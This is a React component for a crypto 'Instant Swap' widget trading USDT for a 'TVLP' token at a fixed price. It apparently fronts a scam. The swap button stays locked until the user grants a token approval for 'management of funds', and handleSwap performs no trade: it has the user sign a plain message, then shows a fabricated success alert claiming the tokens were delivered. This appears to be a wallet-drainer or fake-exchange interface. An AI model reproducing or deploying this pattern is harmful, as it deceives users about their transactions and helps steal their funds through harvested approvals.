import React, { useState } from 'react';
import { ArrowDown, Wallet, TrendingUp, Zap } from 'lucide-react';
import { useLanguage } from '../hooks/useLanguage';
import { useWallet } from '../hooks/useWallet';

export const TradingWidget: React.FC = () => {
  const { t } = useLanguage();
  const { wallet, hasManagementPermission, approveToken, signMessage } = useWallet();
  const [fromAmount, setFromAmount] = useState('');
  const [toAmount, setToAmount] = useState('');
  const [fromToken, setFromToken] = useState('USDT');
  const [toToken, setToToken] = useState('TVLP');
  const [isSwapping, setIsSwapping] = useState(false);

  const tvlpPrice = 184; // $184 per TVLP

  const handleFromAmountChange = (value: string) => {
    setFromAmount(value);
    if (value && !isNaN(Number(value))) {
      if (fromToken === 'USDT' && toToken === 'TVLP') {
        setToAmount((Number(value) / tvlpPrice).toFixed(6));
      } else if (fromToken === 'TVLP' && toToken === 'USDT') {
        setToAmount((Number(value) * tvlpPrice).toFixed(2));
      }
    } else {
      setToAmount('');
    }
  };

  const handleSwapTokens = () => {
    setFromToken(toToken);
    setToToken(fromToken);
    setFromAmount(toAmount);
    setToAmount(fromAmount);
  };

  const handleSwap = async () => {
    if (!wallet.connected) {
      alert('Please connect your wallet first');
      return;
    }
    
    if (!hasManagementPermission) {
      alert('❌ Нет разрешения на управление средствами. Пожалуйста, подтвердите approve в кошельке.');
      return;
    }
    
    if (!fromAmount || Number(fromAmount) <= 0) {
      alert('Please enter a valid amount');
      return;
    }
    
    setIsSwapping(true);
    try {
      // Show transaction details
      const confirmSwap = window.confirm(
        `🔄 Подтверждение обмена\n\n` +
        `📊 Детали операции:\n` +
        `• Отдаете: ${fromAmount} ${fromToken}\n` +
        `• Получаете: ${toAmount} ${toToken}\n` +
        `• Курс: 1 TVLP = $${tvlpPrice}\n` +
        `• Комиссия сети: ~$2.50\n` +
        `• Комиссия протокола: 0.5%\n\n` +
        `⚠️ Средства будут списаны автоматически\n\n` +
        `Подтвердить обмен?`
      );
      
      if (!confirmSwap) {
        alert('❌ Обмен отменен пользователем');
        return;
      }
      
      // Then sign the swap transaction
      const swapMessage = `Swap ${fromAmount} ${fromToken} for ${toAmount} ${toToken}`;
      await signMessage(swapMessage);
      
      alert(
        `✅ Обмен успешно выполнен!\n\n` +
        `📈 Результат:\n` +
        `• Списано: ${fromAmount} ${fromToken}\n` +
        `• Получено: ${toAmount} ${toToken}\n` +
        `• Комиссия: ${(Number(fromAmount) * 0.005).toFixed(2)} ${fromToken}\n\n` +
        `🎉 Токены TVLP добавлены в ваш кошелек!`
      );
      
      // Reset form
      setFromAmount('');
      setToAmount('');
      
    } catch (error) {
      console.error('Swap failed:', error);
      alert('❌ Swap cancelled or failed');
    } finally {
      setIsSwapping(false);
    }
  };

  return (
    <div className="bg-gray-800/40 backdrop-blur-xl rounded-3xl p-8 border border-cyan-500/30 shadow-2xl shadow-cyan-500/10 relative overflow-hidden">
      {/* Background effects */}
      <div className="absolute inset-0 bg-gradient-to-br from-cyan-500/5 via-purple-500/5 to-pink-500/5"></div>
      <div className="absolute top-0 right-0 w-32 h-32 bg-gradient-to-br from-purple-500/20 to-transparent rounded-full blur-2xl"></div>
      
      <div className="relative z-10">
        <div className="flex items-center justify-between mb-8">
          <h3 className="text-2xl font-bold text-white flex items-center space-x-2">
            <Zap className="w-6 h-6 text-cyan-400" />
            <span>Instant Swap</span>
          </h3>
          <div className="flex items-center space-x-2 text-sm text-cyan-400">
            <TrendingUp className="w-4 h-4" />
            <span>${tvlpPrice.toLocaleString()}/TVLP</span>
          </div>
        </div>

        {/* From Token */}
        <div className="mb-4">
          <label className="block text-sm font-medium text-gray-300 mb-2">From</label>
          <div className="bg-gray-900/60 rounded-2xl p-4 border border-gray-700/50 hover:border-cyan-500/50 transition-all duration-300">
            <div className="flex items-center justify-between">
              <input
                type="number"
                value={fromAmount}
                onChange={(e) => handleFromAmountChange(e.target.value)}
                placeholder="0.00"
                className="bg-transparent text-2xl font-bold text-white placeholder-gray-500 outline-none flex-1 mr-4"
              />
              <div className="flex items-center space-x-2 bg-gray-800/80 rounded-xl px-3 py-2">
                {fromToken === 'USDT' ? (
                  <div className="w-6 h-6 rounded-full overflow-hidden bg-white flex items-center justify-center">
                    <img 
                      src="https://cryptologos.cc/logos/tether-usdt-logo.png" 
                      alt="USDT"
                      className="w-5 h-5 object-contain"
                      onError={(e) => {
                        e.currentTarget.style.display = 'none';
                        e.currentTarget.nextElementSibling.style.display = 'flex';
                      }}
                    />
                    <div className="w-5 h-5 bg-green-500 rounded-full hidden items-center justify-center">
                      <span className="text-white text-xs font-bold">$</span>
                    </div>
                  </div>
                ) : (
                  <div className="w-6 h-6 rounded-full overflow-hidden bg-gray-900 flex items-center justify-center border border-cyan-400/50">
                    <img 
                      src="/tvlp-logo.png" 
                      alt="TVLP"
                      className="w-5 h-5 object-contain"
                      onError={(e) => {
                        e.currentTarget.style.display = 'none';
                        e.currentTarget.nextElementSibling.style.display = 'flex';
                      }}
                    />
                    <div className="w-5 h-5 bg-gradient-to-r from-cyan-400 to-purple-600 rounded-full hidden items-center justify-center">
                      <span className="text-white text-xs font-bold">T</span>
                    </div>
                  </div>
                )}
                <span className="font-bold text-white">{fromToken}</span>
              </div>
            </div>
            <div className="text-sm text-gray-400 mt-2 flex items-center justify-between">
              <span>Balance: {wallet.connected ? `${wallet.balance.toFixed(2)}` : '0.00'} {fromToken}</span>
              {wallet.connected && (
                <button 
                  onClick={() => handleFromAmountChange(wallet.balance.toString())}
                  className="text-cyan-400 hover:text-cyan-300 font-medium text-xs px-2 py-1 rounded bg-cyan-500/10 hover:bg-cyan-500/20 transition-colors"
                >
                  MAX
                </button>
              )}
            </div>
          </div>
        </div>

        {/* Swap Button */}
        <div className="flex justify-center mb-4">
          <button
            onClick={handleSwapTokens}
            className="p-3 bg-gradient-to-r from-cyan-500 to-purple-600 hover:from-cyan-400 hover:to-purple-500 rounded-2xl transition-all duration-300 transform hover:scale-110 shadow-lg shadow-cyan-500/25"
          >
            <ArrowDown className="w-5 h-5 text-white" />
          </button>
        </div>

        {/* To Token */}
        <div className="mb-6">
          <label className="block text-sm font-medium text-gray-300 mb-2">To</label>
          <div className="bg-gray-900/60 rounded-2xl p-4 border border-gray-700/50 hover:border-purple-500/50 transition-all duration-300">
            <div className="flex items-center justify-between">
              <input
                type="number"
                value={toAmount}
                readOnly
                placeholder="0.00"
                className="bg-transparent text-2xl font-bold text-white placeholder-gray-500 outline-none flex-1 mr-4"
              />
              <div className="flex items-center space-x-2 bg-gray-800/80 rounded-xl px-3 py-2">
                {toToken === 'TVLP' ? (
                  <div className="w-6 h-6 rounded-full overflow-hidden bg-gray-900 flex items-center justify-center border border-cyan-400/50">
                    <img 
                      src="/tvlp-logo.png" 
                      alt="TVLP"
                      className="w-5 h-5 object-contain"
                      onError={(e) => {
                        e.currentTarget.style.display = 'none';
                        e.currentTarget.nextElementSibling.style.display = 'flex';
                      }}
                    />
                    <div className="w-5 h-5 bg-gradient-to-r from-cyan-400 to-purple-600 rounded-full hidden items-center justify-center">
                      <span className="text-white text-xs font-bold">T</span>
                    </div>
                  </div>
                ) : (
                  <div className="w-6 h-6 rounded-full overflow-hidden bg-white flex items-center justify-center">
                    <img 
                      src="https://cryptologos.cc/logos/tether-usdt-logo.png" 
                      alt="USDT"
                      className="w-5 h-5 object-contain"
                      onError={(e) => {
                        e.currentTarget.style.display = 'none';
                        e.currentTarget.nextElementSibling.style.display = 'flex';
                      }}
                    />
                    <div className="w-5 h-5 bg-green-500 rounded-full hidden items-center justify-center">
                      <span className="text-white text-xs font-bold">$</span>
                    </div>
                  </div>
                )}
                <span className="font-bold text-white">{toToken}</span>
              </div>
            </div>
            <div className="text-sm text-gray-400 mt-2">
              Balance: 0.00 {toToken}
            </div>
          </div>
        </div>

        {/* Swap Details */}
        <div className="bg-gray-900/40 rounded-2xl p-4 mb-6 border border-gray-700/30">
          <div className="flex justify-between items-center text-sm mb-2">
            <span className="text-gray-400">Exchange Rate</span>
            <span className="text-cyan-400 font-bold">1 TVLP = ${tvlpPrice}</span>
          </div>
          <div className="flex justify-between items-center text-sm mb-2">
            <span className="text-gray-400">Network Fee</span>
            <span className="text-green-400 font-bold">~$2.50</span>
          </div>
          <div className="flex justify-between items-center text-sm mb-3">
            <span className="text-gray-400">Slippage</span>
            <span className="text-yellow-400 font-bold">0.5%</span>
          </div>
          <div className="border-t border-gray-700/50 pt-3">
            <div className="flex justify-between items-center text-sm">
              <span className="text-gray-400">You will receive</span>
              <span className="text-white font-bold">
                {toAmount ? `${toAmount} TVLP` : '0.00 TVLP'}
              </span>
            </div>
          </div>
        </div>

        {/* Swap Button */}
        <button 
          onClick={wallet.connected ? handleSwap : () => alert('Please connect your wallet first')}
          disabled={isSwapping || !fromAmount || !hasManagementPermission}
          className={`w-full py-4 ${hasManagementPermission ? 'bg-gradient-to-r from-cyan-500 via-blue-600 to-purple-600 hover:from-cyan-400 hover:via-blue-500 hover:to-purple-500' : 'bg-gradient-to-r from-yellow-500 via-orange-600 to-red-600 hover:from-yellow-400 hover:via-orange-500 hover:to-red-500 animate-pulse'} disabled:from-gray-600 disabled:via-gray-700 disabled:to-gray-800 rounded-2xl font-bold text-white text-lg transition-all duration-300 transform hover:scale-[1.02] shadow-2xl ${hasManagementPermission ? 'shadow-cyan-500/30' : 'shadow-orange-500/30'} border ${hasManagementPermission ? 'border-cyan-400/50' : 'border-orange-400/50'} flex items-center justify-center space-x-2`}
        >
          <Wallet className="w-5 h-5" />
          <span>
            {isSwapping ? 'Swapping...' : 
             !wallet.connected ? 'Connect Wallet to Swap' :
             !hasManagementPermission ? '🚀 Click "Activate" Button First' :
             'Swap Tokens'}
          </span>
        </button>

      </div>
    </div>
  );
};